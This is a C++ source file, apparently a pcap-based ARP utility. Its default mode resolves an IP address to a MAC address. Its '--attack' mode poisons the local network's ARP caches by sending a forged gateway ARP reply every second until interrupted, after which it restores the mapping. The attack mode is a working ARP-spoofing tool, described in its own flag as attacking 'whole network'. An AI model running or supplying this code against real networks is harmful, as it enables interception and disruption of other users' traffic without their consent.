#include <thread>
#include <chrono>
#include <signal.h>
#include "net.h"

DEFINE_string(ip, "", "ipv4 address, only used to choose adapter when in attack mode");
DEFINE_bool(attack, false, "attack whole network by pretending myself to be gateway");

pcap_t *g_adhandle;
adapter_info g_apt_info;

void restore_gateway(int)
{
    if (g_adhandle != nullptr && g_apt_info.gateway != PLACEHOLDER_IPv4_ADDR) {
        if (send_arp(g_adhandle, ARP_REQUEST_OP, g_apt_info.mac, g_apt_info.ip, PLACEHOLDER_ETH_ADDR, g_apt_info.gateway))
        {
            LOG(INFO) << "origin gateway arp map restored";
        }
        else {
            LOG(ERROR) << "failed to restore origin gateway arp map: " << pcap_geterr(g_adhandle);
        }
    }
    exit(0);
}

int main(int argc, char* argv[])
{
    google::InitGoogleLogging(argv[0]);
    gflags::ParseCommandLineFlags(&argc, &argv, true);
    FLAGS_logtostderr = 1;
    FLAGS_minloglevel = 0;

    if (FLAGS_ip.size() <= 0) {
        LOG(ERROR) << "empty ipv4 address";
        return -1;
    }
    ip4_addr input_ip;
    if (FLAGS_ip.size() > 0 && !ip4_from_string(FLAGS_ip, input_ip)) {
        LOG(ERROR) << "invalid ipv4 address: " << FLAGS_ip;
        return -1;
    }

    std::string devname;
    ip4_addr local_ip;
    pcap_if_t *alldevs;
    char errbuf[PCAP_ERRBUF_SIZE];
    if (pcap_findalldevs(&alldevs, errbuf) == -1)
    {
        LOG(ERROR) << "failed to find all device: " << errbuf;
        return -1;
    }
    bool found = false;
    for (pcap_if_t *d = alldevs; d; d = d->next)
    {
        for (const pcap_addr_t *a = d->addresses; a; a = a->next) {
            if (a->addr && a->addr->sa_family == AF_INET) {
                auto ip = reinterpret_cast<const sockaddr_in*>(a->addr)->sin_addr;
                auto ip_addr = ip4_from_win(ip);
                auto mask = reinterpret_cast<const sockaddr_in*>(a->netmask)->sin_addr;
                auto mask_addr = ip4_from_win(mask);
                if ((ip_addr & mask_addr) == (input_ip & mask_addr)) {
                    local_ip = ip_addr;
                    devname = d->name;
                    found = true;
                    break;
                }
            }
        }
        if (found) {
            break;
        }
    }
    pcap_freealldevs(alldevs);
    if (!found) {
        LOG(ERROR) << "failed to match adapter accroding to netmask";
        return -1;
    }

    if (!get_adapter_info_by_ip4(local_ip, g_apt_info)) {
        LOG(ERROR) << "failed to get more adapter info";
        return -1;
    }

    if (!(g_adhandle= pcap_open(devname.c_str(), 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errbuf)))
    {
        LOG(ERROR) << "failed to open the adapter";
        return -1;
    }

    if (FLAGS_attack) {
        if (g_apt_info.gateway == PLACEHOLDER_IPv4_ADDR) {
            LOG(ERROR) << "no valid gateway info: " << g_apt_info.gateway;
            return -1;
        }
        signal(SIGINT, restore_gateway); 
        LOG(INFO) << "pretending to be gateway " << g_apt_info.gateway << "...";
        while (true) {
            send_arp(g_adhandle, ARP_REPLY_OP, g_apt_info.mac, g_apt_info.gateway, g_apt_info.mac, g_apt_info.ip);
            std::this_thread::sleep_for(std::chrono::milliseconds(1000));
        }
    }
    else {
        if (!send_arp(g_adhandle, ARP_REQUEST_OP, g_apt_info.mac, g_apt_info.ip, PLACEHOLDER_ETH_ADDR, input_ip))
        {
            LOG(ERROR) << "failed to send packet: " << pcap_geterr(g_adhandle);
            return -1;
        }
        int res;
        pcap_pkthdr *header;
        const u_char *pkt_data;
        while((res = pcap_next_ex(g_adhandle, &header, &pkt_data)) >= 0)
        {
            if (res == 0) {
                VLOG(3) << "timeout elapsed";
                continue;
            }
            auto eh = reinterpret_cast<const ethernet_header*>(pkt_data);
            if (ntohs(eh->eth_type) == ETHERNET_TYPE_ARP) {
                auto ah = reinterpret_cast<const eth_ip4_arp*>(pkt_data + sizeof(ethernet_header));
                if (ntohs(ah->op) == ARP_REPLY_OP) {
                    if (ah->sia == input_ip) {
                        std::cout << input_ip << " is at " << ah->sea << "." << std::endl;
                        break;
                    }
                }
            }
        }
        if (res == -1) {
            LOG(ERROR) << "failed to read packets: " << pcap_geterr(g_adhandle);
            return -1;
        }
    }
}